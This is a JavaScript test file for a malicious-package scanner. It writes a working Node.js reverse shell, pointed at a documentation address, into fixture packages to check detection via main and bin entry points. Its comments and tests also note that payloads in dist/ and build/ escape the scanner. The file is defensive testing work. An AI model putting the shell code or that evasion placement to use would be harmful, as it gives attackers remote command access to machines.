'use strict';

// Executed files must not be dropped by the dev-file filter (src/shared/analyze-helper.js).
// Before: a reverse shell scored 0 when the file that runs was named or placed like dev
// code: "main": "latest.js" (matches the *test.js dev pattern), "main": "tools/index.js",
// a bin in docs/. Files reachable from the entry points now bypass that filter; unreachable
// files in the same directories stay excluded.
// KNOWN LIMIT, pinned below: dist/, build/, out/ and output/ are still not read by the
// heuristic scanners, even when executed. Scanning them was measured (2026-11-08) and
// deferred: it pushed agent/CLI tools to >= 75 through detached_process / MCP /
// ci_environment_probe rules with no TP gained.

const fs = require('fs');
const os = require('os');
const path = require('path');
const { asyncTest, assert, runScanDirect, cleanupTemp } = require('../test-utils');

// Reverse shell to a TEST-NET-3 documentation address (203.0.113.0/24, never routed).
const SHELL = 'var net=require("net"),cp=require("child_process");var c=new net.Socket();' +
  'c.connect(4444,"203.0.113.7",function(){var sh=cp.spawn("/bin/sh",[]);c.pipe(sh.stdin);sh.stdout.pipe(c);});\n';

async function scan(pkgFields, files) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-exec-'));
  try {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'exec-demo', version: '1.0.0', ...pkgFields }));
    for (const [rel, c] of Object.entries(files)) {
      fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
      fs.writeFileSync(path.join(dir, rel), c);
    }
    return await runScanDirect(dir);
  } finally {
    cleanupTemp(dir);
  }
}

const has = (r, t) => r.threats.some(x => x.type === t);
const show = r => `score=${r.summary.riskScore} ${[...new Set(r.threats.map(t => t.type))].join(',')}`;

async function runExecutedFilesTests() {
  console.log('\n=== EXECUTED FILES IN DEV/BUILD PATHS ===\n');

  const detected = [
    ['"main": "latest.js" (matches the *test.js dev pattern)', { main: 'latest.js' }, { 'latest.js': SHELL }],
    ['"main": "tools/index.js"', { main: 'tools/index.js' }, { 'tools/index.js': SHELL }],
    ['bin in docs/', { bin: { demo: 'docs/cli.js' } }, { 'docs/cli.js': SHELL }]
  ];
  for (const [name, pkg, files] of detected) {
    await asyncTest(`EXEC: reverse shell executed via ${name} is detected`, async () => {
      const r = await scan(pkg, files);
      assert(has(r, 'reverse_shell'), 'executed payload not analyzed: ' + show(r));
    });
  }

  const knownLimit = [
    ['bin in build/', { bin: { demo: 'build/cli.js' } }, { 'build/cli.js': SHELL }],
    ['main in dist/ requiring the payload', { main: 'dist/index.js' }, { 'dist/index.js': 'module.exports = require("./p");\n', 'dist/p.js': SHELL }]
  ];
  for (const [name, pkg, files] of knownLimit) {
    await asyncTest(`EXEC known limit: payload executed via ${name} is not analyzed (dist/build/out not read)`, async () => {
      const r = await scan(pkg, files);
      assert(!has(r, 'reverse_shell'), 'dist/build/out is now read: update this test and the CHANGELOG known limit: ' + show(r));
    });
  }

  const ignored = [
    ['an unreachable file in dist/', { 'index.js': 'module.exports = 1;\n', 'dist/p.js': SHELL }],
    ['an unreachable file in tools/', { 'index.js': 'module.exports = 1;\n', 'tools/p.js': SHELL }]
  ];
  for (const [name, files] of ignored) {
    await asyncTest(`EXEC: ${name} stays excluded (noise filter kept for non-executed code)`, async () => {
      const r = await scan({ main: 'index.js' }, files);
      assert(!has(r, 'reverse_shell'), 'unreachable file was analyzed: ' + show(r));
    });
  }
}

module.exports = { runExecutedFilesTests };
